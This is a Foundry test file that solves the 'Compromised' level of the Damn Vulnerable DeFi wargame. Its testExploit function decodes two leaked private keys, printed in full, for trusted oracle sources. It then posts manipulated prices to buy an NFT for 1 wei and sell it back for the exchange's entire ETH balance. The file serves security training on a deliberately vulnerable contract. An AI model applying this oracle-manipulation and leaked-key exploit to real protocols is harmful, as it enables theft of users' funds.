// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

contract Compromised is Test {
     /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 internal constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal player;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        player = payable(address(uint160(uint256(keccak256(abi.encodePacked("player"))))));

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen;) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            unchecked {
                ++i;
            }
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.label(player, "Player");
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen;) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen;) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();
        assertEq(damnValuableNFT.owner() , address(0)); // ownership renounced
        assertEq(damnValuableNFT.rolesOf(address(exchange)), damnValuableNFT.MINTER_ROLE());

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        // This was an interesting challenge. The solution to this challenge is actually not in any of the contract files but outside of it. What you need to notice is that in the DVD challenge presentation, some keys were displayed on the black screen :
        // HTTP/2 200 OK
        // content-type: text/html
        // content-language: en
        // vary: Accept-Encoding
        // server: cloudflare

        // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

        // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34

        // After some research, I noticed that these are private keys encode in base64 format. We need to format these keys and convert them to string.
        bytes memory someHex1 = hex"4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535";
        bytes memory someHex2 = hex"4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134";

        // Let's convert this to a strings. We can clearly seen now that this resembles private keys
        string memory someString1 = vm.toString(someHex1); //MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
        string memory someString2 = string(someHex2); //MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
        // This looks like private keys encode into base64 format. 

        // We now have to decode these keys.

        // Unfortunately, I couldn't find any good base64 decoder library in solidity so we would have to do this manually via https://www.base64decode.org/.
        string memory privateKeySource1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        string memory privateKeySource2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        console.log(vm.addr(vm.parseUint(privateKeySource1))); // 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
        console.log(vm.addr(vm.parseUint(privateKeySource2))); // 0x81A5D6E50C214044bE44cA0CB057fe119097850c

        // The function _computeMedianPrice will always return the second price prices[1]. However, since this function calls sort on the array of prices. The lowest price will become the first value of the array or prices[0]. So in order to change the price, we will have to use both sources so that when sort is called, prices[1] will also contain the lowest price
        vm.startBroadcast(vm.parseUint(privateKeySource1));
        trustfulOracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();

        vm.startBroadcast(vm.parseUint(privateKeySource2));
        trustfulOracle.postPrice("DVNFT", 0);
        vm.stopBroadcast();

        // We buy an NFT with price = 0
        vm.prank(player);
        uint256 id = exchange.buyOne{value : 1 wei}();

        // We change the price again and post the maximum price = the exchange balance. We Use both sources again in order for the second price to also have the max value.
        vm.startBroadcast(vm.parseUint(privateKeySource1));
        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
        vm.stopBroadcast();

        vm.startBroadcast(vm.parseUint(privateKeySource2));
        trustfulOracle.postPrice("DVNFT", address(exchange).balance);
        vm.stopBroadcast();

        // We sell the NFT for the maximum price.
        vm.prank(player);
        damnValuableNFT.approve(address(exchange), id);
        vm.prank(player);
        exchange.sellOne(id);

        // At this we have one price = 999e18 and two prices = 9990e18. We only need to post the old price with one source so that the first two value of the array prices are equal to 999e18. The function _computeMedianPrice will return prices[1] == 999e18 which is enough fo this tests to pass.
        vm.startBroadcast(vm.parseUint(privateKeySource1));
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopBroadcast();
        





        // vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Players's ETH balance must have significantly increased
        assertGt(player.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(damnValuableNFT.balanceOf(player), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}


